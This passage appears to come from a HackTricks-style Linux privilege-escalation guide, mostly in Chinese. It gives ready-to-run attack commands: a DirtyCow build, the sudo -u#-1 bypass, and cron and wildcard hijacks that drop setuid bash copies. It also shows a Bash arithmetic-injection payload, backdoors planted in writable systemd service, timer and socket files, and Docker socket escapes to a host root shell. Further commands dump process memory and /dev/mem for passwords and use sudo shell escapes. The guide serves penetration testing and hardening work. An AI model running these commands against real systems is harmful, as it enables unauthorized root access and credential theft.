# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始收集关于正在运行的操作系统的一些信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你 **对 `PATH` 变量中任何文件夹具有写入权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

在环境变量中是否有有趣的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，并查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的易受攻击的内核列表以及一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以这样做:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在 victim 上执行，仅检查 kernel 2.x 的 exploits)

始终 **在 Google 上搜索 kernel 版本**，也许你的 kernel 版本已在某个 kernel exploit 中被提及，这样你就能确定该 exploit 是否可用。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，获取该 vuln 如何被利用的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在一个 docker 容器内，你可以尝试从中逃逸：


{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载或未挂载**、在哪儿以及为什么。如果有任何未挂载的项，你可以尝试将其挂载并检查是否有私有信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 实用软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了 **任何编译器**。如果你需要使用某些 kernel exploit，这会很有用，因为建议在打算使用它的机器上（或在一台类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查已安装的软件包和服务的**版本**。可能存在旧的 Nagios 版本（例如），可被利用来提权…\
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，你也可以使用 **openVAS** 来检查机器中已安装的过时和存在漏洞的软件。

> [!NOTE] > _请注意，这些命令会显示大量且大多无用的信息，因此建议使用像 OpenVAS 或类似的应用程序来检查已安装的软件版本是否存在已知 exploits 可利用的漏洞_

## 进程

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **比它应有的更多权限**（也许某个 tomcat 由 root 执行？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测它们。\
另外**检查你对进程二进制文件的权限**，也许你可以覆盖某些文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这在识别经常被执行或在满足特定条件时运行的易受攻击进程时非常有用。

### 进程内存

有些服务器的服务会将**凭据以明文保存在内存中**。\
通常你需要**root 权限**来读取属于其他用户的进程内存，因此这通常在你已经是 root 并想发现更多凭据时更有用。\
但是，请记住，**作为普通用户你可以读取你所拥有的进程的内存**。

> [!WARNING]
> 注意，如今大多数机器**默认不允许 ptrace**，这意味着你无法转储属于你非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们具有相同的 uid。这是 ptrace 传统的工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不允许使用 ptrace 跟踪任何进程。设置后，需重启才能再次启用 ptrace。

#### GDB

如果你可以访问一个 FTP 服务（例如）的内存，你可以获取 Heap 并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示内存如何在该进程的** 虚拟地址空间中被映射；它还显示**每个映射区域的权限**。该 **mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件我们知道哪些**内存区域是可读的**以及它们的偏移。我们使用这些信息**seek into the mem file and dump all readable regions** 到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对 Sysinternals 工具套件中用于 Windows 的经典 ProcDump 工具在 Linux 平台上的重新实现。可从以下网址获取： [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)（需要 root）

### 从进程内存获取凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 该进程（参见前文以了解不同的进程内存 dump 方法），并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将**从内存窃取明文凭证**并从一些**已知文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名               |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时任务/Cron jobs

检查是否有任何定时任务存在漏洞。也许你可以利用由 root 执行的 script（wildcard vuln? 可以修改 root 使用的文件? 使用 symlinks? 在 root 使用的目录中创建特定文件?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例如，在 _/etc/crontab_ 中你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 拥有写权限_)

如果在这个 crontab 中 root 用户尝试执行某个命令或脚本但没有设置 PATH。例如： _\* \* \* \* root overwrite.sh_\
然后，你可以通过使用以下方法获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果脚本以 root 身份执行，并且命令中包含 “**\***”，你可以利用这一点触发意外行为（例如 privesc）。示例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符出现在像** _**/some/path/\***_ **的路径之前，则它不易受到影响（即使** _**./\***_ **也不受影响）。**

阅读下列页面以获取更多通配符利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 中的 arithmetic evaluation 之前会执行 parameter expansion 和 command substitution。如果一个 root cron/parser 读取不受信任的日志字段并将其送入算术上下文，攻击者可以注入 command substitution $(...)，在 cron 运行时该命令会以 root 身份执行。

- 为什么它有效：在 Bash 中，expansions 的执行顺序为：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），然后剩余的数字 `0` 用于算术运算，使脚本继续而不出错。

- 典型易受攻击模式:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方法：让受攻击者控制的文本被写入被解析的日志，使看起来像数字的字段包含一个 command substitution 并以数字结尾。确保你的命令不向 stdout 输出（或将其重定向），以保持算术有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改一个由 root 执行的 cron script**，你可以很容易获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果被 root 执行的 script 使用了一个你拥有 **directory where you have full access**，那么删除该 directory 并 **create a symlink folder to another one**（指向由你控制并提供 script 的目录）可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监控进程以查找每隔 1、2 或 5 分钟被执行的进程。也许你可以利用它来提权。

例如，要 **以每 0.1 秒监控 1 分钟**、**按执行次数较少排序命令** 并删除执行次数最多的命令，你可以做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (它将监视并列出每个启动的进程)。

### 隐形 cron jobs

可以创建一个 cronjob，**在注释后插入回车字符**（不包含换行符），并且该 cron job 会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，以便它**执行**你的**backdoor 当**服务**启动**、**重启**或**停止**时（可能需要等到机器重启）。\
例如在 .service 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你**对正在被 services 执行的 binaries 拥有写权限**，你可以把它们改成 backdoors，这样当 services 被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现自己可以在路径的任一文件夹中**写入**，那么你可能能够**提升权限**。你需要搜索**在服务配置文件中使用的相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写的 systemd PATH 文件夹中，创建一个与相对路径 binary 同名的 **可执行文件**，当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **backdoor 将被执行**（非特权用户通常不能 start/stop services，但检查是否可以使用 `sudo -l`）。

**关于 services 的更多信息，请参阅 `man systemd.service`.**

## **Timers（计时器）**

Timers 是 systemd 单元文件，其名称以 **.timer** 结尾，用于控制 **.service** 文件或事件。Timers 可用作 cron 的替代方案，因为它们对日历时间事件和单调时间事件具有内置支持，并且可以异步运行。

你可以使用以下命令枚举所有的计时器：
```bash
systemctl list-timers --all
```
### 可写计时器

如果你可以修改一个 timer，你可以让它执行 systemd.unit 的某些现有单元（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> 在计时器到期时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为与 timer unit 同名但后缀不同的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的名称除了后缀外应相同。

Therefore, to abuse this permission you would need to:

- 找到某个 systemd unit（例如 `.service`），它正在 **执行一个可写的二进制文件**
- 找到某个 systemd unit 正在 **执行相对路径**，且你对 **systemd PATH** 拥有 **写权限**（以冒充该可执行文件）

**Learn more about timers with `man systemd.timer`.**

### **启用计时器**

要启用计时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意 **timer** 是通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建指向它的符号链接来**激活**的。

## Sockets

Unix Domain Sockets (UDS) 在客户端-服务器模型中允许在同一台或不同机器之间进行**进程通信**。它们使用标准的 Unix 描述符文件进行主机间通信，并通过 `.socket` 文件进行配置。

Sockets 可以使用 `.socket` 文件进行配置。

**Learn more about sockets with `man systemd.socket`.** 在该文件中，可以配置若干有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将在哪监听**该 socket（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果为 **true**，则会为每个传入连接**生成一个 service 实例**，并且只将连接的 socket 传递给它。如果为 **false**，则所有监听 sockets 本身会**被传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。对于 datagram sockets 和 FIFOs，该值被忽略，因为单个 service 单元无条件处理所有传入流量。**默认值为 false**。出于性能考虑，建议新守护进程以适配 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，分别在监听的 **sockets**/FIFOs 被**创建**并绑定之前或之后**执行**。命令行的第一个标记必须是一个绝对文件名，随后是该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 额外的**命令**，分别在监听的 **sockets**/FIFOs 被**关闭**并移除之前或之后**执行**。
- `Service`: 指定在有**传入流量**时要**激活**的 **service** 单元名称。此设置仅允许用于 Accept=no 的 socket。默认是与 socket 同名的 service（后缀被替换）。在大多数情况下，通常不需要使用此选项。

### 可写的 .socket 文件

如果你发现一个**可写的** `.socket` 文件，你可以在 `[Socket]` 部分开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 会在 socket 被创建之前执行。因此，你**可能需要等到机器重启。**\
_注意，系统必须正在使用该 socket 文件配置，否则 backdoor 不会被执行_

### 可写的 sockets

如果你**识别到任何可写的 socket**（_这里指的是 Unix Sockets，而不是配置的 `.socket` 文件_），那么**你可以与该 socket 进行通信**，并可能利用其中的漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意可能存在一些 **sockets listening for HTTP** 请求 (_我不是在说 .socket files，而是那些充当 unix sockets 的文件_)。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **对 HTTP 请求有响应**，那么你可以与它 **通信**，并可能 **exploit some vulnerability**。

### 可写 Docker Socket

Docker socket，通常位于 `/var/run/docker.sock`，是一个需要加固的关键文件。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。对该 socket 拥有写权限可能导致 privilege escalation。下面是该操作的分解说明，以及当 Docker CLI 不可用时的替代方法。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 权限访问主机的文件系统。

#### **直接使用 Docker API**

当 Docker CLI 不可用时，仍然可以使用 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：** 发送请求以创建一个将主机根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container：** 使用 `socat` 建立与容器的连接，从而在容器内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以在容器中直接执行命令，并以 root 权限访问主机的文件系统。

### Others

注意，如果你对 docker socket 有写权限，因为你是 **inside the group `docker`**，你有 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看 **更多从 docker 逃逸或滥用它以提升权限的方法** 在：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现你可以使用 **`ctr`** 命令，请阅读以下页面，因为 **你可能能够滥用它以提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现你可以使用 **`runc`** 命令，请阅读以下页面，因为 **你可能能够滥用它以提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 **inter-Process Communication (IPC) 系统**，使应用程序能够高效地交互并共享数据。它为现代 Linux 系统而设计，提供了用于各种应用间通信的强大框架。

该系统功能多样，支持基本的 IPC，增强进程间的数据交换，类似于 **增强的 UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth 守护进程关于来电的信号可以促使音乐播放器静音，从而改善用户体验。此外，D-Bus 支持远程对象系统，简化应用之间的服务请求和方法调用，使传统上复杂的流程变得更简便。

D-Bus 使用 **allow/deny 模型**（允许/拒绝模型）运行，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略规定了与 bus 的交互，可能通过利用这些权限实现权限提升。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中给出了这样一个策略示例，详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息的权限。

没有指定用户或组的策略适用于所有用户，而“default”上下文策略适用于未被其他具体策略覆盖的所有实体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此了解如何 enumerate and exploit D-Bus communication:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行 enumerate 并确定机器的位置通常很有帮助。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在你访问该机器之前无法与之交互的正在运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff traffic。 如果可以，你可能能够抓取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **你是谁**、你拥有哪些 **权限**、系统中有哪些 **用户**、哪些可以 **登录** 以及哪些拥有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些 Linux 版本受一个漏洞影响，允许具有 **UID > INT_MAX** 的用户提升权限。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用方法**: **`systemd-run -t /bin/bash`**

### 组

检查你是否是 **某个组的成员**，该组可能授予你 root 权限：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，**尝试使用该密码登录每个用户**。

### Su Brute

如果不介意产生大量噪音，且目标主机上存在 `su` 和 `timeout` 二进制文件，你可以使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写 PATH 滥用

### $PATH

如果你发现可以**写入 $PATH 的某个文件夹内**，你可能能够通过在该可写文件夹中**创建一个后门**来提升权限，后门的名称应为某个将由不同用户（理想情况下为 root）执行的命令，并且该命令**不会从位于你可写文件夹之前的文件夹加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者它们可能有 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到 root 目录或调用 `sh` 来获取 shell 变得很容易。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例，**based on HTB machine Admirer**，**易受攻击**于 **PYTHONPATH hijacking**，可以在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

